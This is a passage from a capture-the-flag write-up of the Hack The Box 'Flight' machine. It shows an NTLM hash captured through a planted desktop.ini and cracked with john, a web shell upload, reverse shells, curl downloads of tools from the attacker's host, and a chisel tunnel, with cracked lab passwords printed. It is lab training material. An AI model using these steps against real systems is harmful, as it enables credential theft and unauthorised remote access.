+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+  .                                   D        0  Wed Feb 14 05:18:15 2024
+  ..                                  D        0  Wed Feb 14 05:18:15 2024
+
+		5056511 blocks of size 4096. 1243490 blocks available</span></span></span></code></pre><div id="https://www.notion.so/2b421f8f2e94469a8d203389d6fcc4d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">desktop.ini</code></span><span class="SemanticString"> is a configuration file used by Windows to customize the appearance and behavior of folders. Once again, the icon file is set to be from my remote share:</span></span></p></div><pre id="https://www.notion.so/3d83bafc49f44a35bc2c184c7fc101fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[.ShellClassInfo]
+IconResource=\\10.10.14.35\aa</span></span></span></code></pre><div id="https://www.notion.so/f3d70633ee0f481ba760c9f5fd1ca82a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This time, the upload operation seems to be successful.</span></span></p></div><pre id="https://www.notion.so/3dd29bf760324dcd91e47c265524aa56" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> put desktop.ini
+
+putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)</span></span></span></code></pre><div id="https://www.notion.so/a29782d7d78c47caa1581f43eae3a264" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Within minutes, another hash is captured on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">responder</code></span><span class="SemanticString">, this time for the user </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/c716055eee504572a1004afd61d8d7dd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.228.120
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:7d8cc77903860426:AD60D8BE17768C68BDC4BDF
+E8AE459E2:0101000000000000004E5812CB5EDA0105DB4974846CADED00000000020008004F0031003600
+580001001E00570049004E002D004A003800430037004900380056004900410055004D0004003400570049
+004E002D004A003800430037004900380056004900410055004D002E004F003100360058002E004C004F00
+430041004C00030014004F003100360058002E004C004F00430041004C00050014004F003100360058002E
+004C004F00430041004C0007000800004E5812CB5EDA010600040002000000080030003000000000000000
+00000000003000003298686587DD200FB6B6AC21A28807B25BF84E5277F8E6B54081B461CB88D6310A0010
+00000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00
+310034002E00330035000000000000000000</span></span></span></code></pre><div id="https://www.notion.so/623ec5127f7c4afcb464b09e1a1b0c0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Sending it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> again, and it once again cracked the password to be </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Tikkycoll_431012284</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/b73f3b9f554642d99bfe1612b6cc0f4f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt c.bum.hash     
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>Tikkycoll_431012284 (c.bum)</span></mark></span><span class="SemanticString"><span> 
+1g 0:00:00:03 DONE (2024-02-13 22:26) 0.3194g/s 3368Kp/s 3368Kc/s 3368KC/s TinyMutt69..Teacher21
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/4ed4f6ce6faf4237a64a9f9ceba699aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/80c2cadc035f4d4bbe5a93058a6bbbb5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SMB Access as </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">C.Bum</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/49169be016744884ae90f631e1435895" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the new set of credentials, I immediately tried authenticating to WinRM, but the user has no access to it.</span></span></p></div><pre id="https://www.notion.so/b5168d2061fd478ba11205d2f9201124" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u &#x27;c.bum&#x27; -p &#x27;Tikkycoll_431012284&#x27; -i flight.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1</span></span></span></code></pre><div id="https://www.notion.so/62578e18889f482481043808675b6bed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On SMB, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString"> has extra write access to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Web</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/4a34cce9ce6143d583819f5777f19d15" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb flight.htb -u &#x27;C.Bum&#x27; -p &#x27;Tikkycoll_431012284&#x27; --shares
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
+SMB         flight.htb      445    G0               [+] Enumerated shares
+SMB         flight.htb      445    G0               Share           Permissions     Remark
+SMB         flight.htb      445    G0               -----           -----------     ------
+SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
+SMB         flight.htb      445    G0               C$                              Default share
+SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
+SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
+SMB         flight.htb      445    G0               Shared          READ,WRITE      
+SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
+SMB         flight.htb      445    G0               Users           READ            
+SMB         flight.htb      445    G0               Web             READ,WRITE</span></span></span></code></pre><div id="https://www.notion.so/b6349bf3896a49dabf5865bcd329bc60" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ba09368a89f8414d8383ce5a5285d306" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web Shell Upload:</strong></span></span></p></div><div id="https://www.notion.so/39c242f33e3a4f589ec7116e341ead24" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This part is pretty straightforward. I’ll drop a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/flozz/p0wny-shell">p0wnyshell</a></span><span class="SemanticString"> in the web root of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">school.flight.htb</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1e9bbcba35474b6896f44f797cdcfb42" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;C.Bum%Tikkycoll_431012284&#x27; \\\\flight.htb\\Web
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> cd school.flight.htb
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \school.flight.htb\&gt;</span></mark></span><span class="SemanticString"><span> put shell.php
+
+putting file shell.php as \school.flight.htb\shell.php (14.5 kb/s) (average 14.5 kb/s)</span></span></span></code></pre><div id="https://www.notion.so/50634e6729c44a06b3b5ac9f0c8e5f1d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Which can be accessed at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">school.flight.htb/shell.php</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/828f804c722e4401ad7a4734a0c5a003" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F370e56ab-41df-47b0-a2a2-a1913513b78b%2FUntitled.png?width=1913&amp;table=block&amp;id=828f804c-722e-4401-ad7a-4734a0c5a003"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F370e56ab-41df-47b0-a2a2-a1913513b78b%2FUntitled.png?width=1913&amp;table=block&amp;id=828f804c-722e-4401-ad7a-4734a0c5a003" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/348cd6aae2cc4918a9d226ef9d1fbc6e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On the web shell, I first downloaded a nc binary: (could also be uploaded via SMB)</span></span></p></div><div id="https://www.notion.so/7c724dcbc69f4822ad0e79c17a8d9ed6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F57fc6380-c3f2-4386-96c7-ebc2dac1a308%2FUntitled.png?width=896&amp;table=block&amp;id=7c724dcb-c69f-4822-ad0e-79c17a8d9ed6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F57fc6380-c3f2-4386-96c7-ebc2dac1a308%2FUntitled.png?width=896&amp;table=block&amp;id=7c724dcb-c69f-4822-ad0e-79c17a8d9ed6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f9e1261c73404f168caceb8d71cd69c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then ran a reverse shell payload:</span></span></p></div><div id="https://www.notion.so/9d9af543cbed46d4bc74a5305895c3ed" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fea42e515-1e17-45bd-87ed-c7d42ea4c6e0%2FUntitled.png?width=748&amp;table=block&amp;id=9d9af543-cbed-46d4-bc74-a5305895c3ed"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fea42e515-1e17-45bd-87ed-c7d42ea4c6e0%2FUntitled.png?width=748&amp;table=block&amp;id=9d9af543-cbed-46d4-bc74-a5305895c3ed" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4717f5ebe38f4f59b7205d25d677956d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And finally, after going through 3 sets of credentials, I have a shell.</span></span></p></div><pre id="https://www.notion.so/0aba1e0452c247b99d14db34b272a487" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.129.228.120] 55327
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs\school.flight.htb&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+flight\svc_apache</span></span></span></code></pre><div id="https://www.notion.so/c154da80c3d648f980951a1bd34fbe32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e28e42c16f404d7e947ec51d4669e484" class="Divider"></div><h3 id="https://www.notion.so/b2715c2e411241089a0ac3801b3579af" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/b2715c2e411241089a0ac3801b3579af"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_apache</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/0dfc799a81d94faba70d3dd001f7c530" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s nothing interesting in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_apache</code></span><span class="SemanticString">&#x27;s home directory, and the user doesn’t have any useful privileges. I’ll check what other users are on this machine:</span></span></p></div><pre id="https://www.notion.so/59ed3d516d32433aafd44574932dd62a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_apache\desktop&gt;</span></mark></span><span class="SemanticString"><span> net user
+
+User accounts for \\G0
+
+-------------------------------------------------------------------------------
+Administrator            C.Bum                    krbtgt
+The command completed successfully.</span></span></span></code></pre><div id="https://www.notion.so/834a798ee0874b3aa403a0d92b53bdda" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since we already have </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString">&#x27;s creds, I can spawn another shell session as the other user using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a></span><span class="SemanticString"> and </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell.exe</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/7798159dd6b34ad8994d19b8ce4ee835" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_apache\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.35:8000/RunasCs.exe -o RunasCs.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_apache\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.35:8000/ConPtyShell.exe -o c:\windows\temp\ConPtyShell.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_apache\desktop&gt;</span></mark></span><span class="SemanticString"><span> icacls c:\windows\temp\ConPtyShell.exe /grant Everyone:F
+
+processed file: c:\windows\temp\ConPtyShell.exe
+Successfully processed 1 files; Failed processing 0 files
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_apache\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe C.Bum Tikkycoll_431012284 &quot;c:\windows\temp\ConPtyShell.exe 10.10.14.35 8001&quot; -t 0
+
+[*] Warning: The logon for user &#x27;C.Bum&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-8876a$\Default
+[+] Async process &#x27;c:\windows\temp\ConPtyShell.exe 10.10.14.35 8001&#x27; with pid 3596 created in background.</span></span></span></code></pre><div id="https://www.notion.so/f5a01762855f442fb91322c52a84acde" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now I have an interactive shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/e4d4a566a93a43c2b9fc323c4621b680" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>PS C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+flight\c.bum</span></span></span></code></pre><div id="https://www.notion.so/a3613d3ba0734b9ea691165159fae202" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2e29d2eae989464f8ba6c652d23c116e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/e7daf1a7174041d08bc96d6382224035" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\c.bum\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+2c9684e5************************</span></span></span></code></pre><div id="https://www.notion.so/60f68ad2225e4f27a21be1b7aa6f9ef0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9a8fc493f3404319bbbd14c4823271aa" class="Divider"></div><h3 id="https://www.notion.so/44a0f0f5a77347758f2036bb07d441eb" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/44a0f0f5a77347758f2036bb07d441eb"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/c17586a444dc4476bb0145dd2c5b0766" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">winPEAS:</strong></span></span></p></div><div id="https://www.notion.so/c96d71e92fe142669817f15b4940f400" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">WinPEAS</code></span><span class="SemanticString"> found the box listening on port 8000. This port never showed up in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nmap</code></span><span class="SemanticString"> scan, so it’s likely blocked by some firewall rules.</span></span></p></div><div id="https://www.notion.so/7c6584f5a0a94d52a53cdafbb6559f5e" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2e4e9e18-3c62-4ba6-82cd-94be558deda6%2FUntitled.png?width=1763&amp;table=block&amp;id=7c6584f5-a0a9-4d52-a53c-dafbb6559f5e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2e4e9e18-3c62-4ba6-82cd-94be558deda6%2FUntitled.png?width=1763&amp;table=block&amp;id=7c6584f5-a0a9-4d52-a53c-dafbb6559f5e" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c8f9514d97bd489d88b83f0a25a60541" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, in addition to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\xampp\</code></span><span class="SemanticString">, there’s also a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\inetpub\</code></span><span class="SemanticString"> directory on the box. I’m guessing that IIS server is running an internal site on port 8000.</span></span></p></div><pre id="https://www.notion.so/bfb7af93c1704e56b7648cba9a00430f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\c.bum\desktop&gt;</span></mark></span><span class="SemanticString"><span> dir c:\inetpub
+
+
+    Directory: C:\inetpub
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/22/2022  12:24 PM                custerr                                                               
+d-----        2/13/2024  11:33 AM                development                                                           
+d-----        9/22/2022   1:08 PM                history                                                               
+d-----        9/22/2022  12:32 PM                logs                                                                  
+d-----        9/22/2022  12:24 PM                temp                                                                  
+d-----        9/22/2022  12:28 PM                wwwroot</span></span></span></code></pre><div id="https://www.notion.so/16c23abbfb9d46c6a69d76f60e868752" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s two ways to access this web server.</span></span></p></div><div id="https://www.notion.so/fd64093d0964477483c726672caa98c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/261d5df3f81a4a90aaadcd14bc368115" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Obvious Approach — Port Forwarding with </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">chisel</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/ba4d236fc0d54604a83570c3b7a1d751" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my host, I’ll first start the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chisel</code></span><span class="SemanticString"> listener on port 5000:</span></span></p></div><pre id="https://www.notion.so/cb572d98a7394614b2eecd0613adc822" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> ./chisel server -p 5000 --reverse
+
+2024/02/13 23:10:19 server: Reverse tunnelling enabled
+2024/02/13 23:10:19 server: Fingerprint dKH3A1a2/T5jxtRbrJ5mr6W68EXsKAi1pjL95eB2ZBs=
+2024/02/13 23:10:19 server: Listening on http://0.0.0.0:5000</span></span></span></code></pre><div id="https://www.notion.so/fff4dfda8efa4bacaa5504ac96aa5eca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll also run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chisel</code></span><span class="SemanticString"> on the box, forwarding my local port 8000 to the server’s port 8000:</span></span></p></div><pre id="https://www.notion.so/fecd2f555c8f4bcf99f5a375d5b60e6e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\c.bum\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\chisel_win client 10.10.14.35:5000 R:8000:127.0.0.1:8000</span></span></span></code></pre><div id="https://www.notion.so/a1e93299094a4974a14f0c3acb47533c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now the site is accessible at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://localhost:8000</code></span><span class="SemanticString">. Similar to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">flight.htb</code></span><span class="SemanticString">, it seems to also be a flight booking system, but with a different interface.</span></span></p></div><div id="https://www.notion.so/a05a2bb238d54f98a0c3fc052f31a71f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fcfd6acd0-077f-4d3b-a2af-85a22b47d430%2FUntitled.png?width=1919&amp;table=block&amp;id=a05a2bb2-38d5-4f98-a0c3-fc052f31a71f"><img 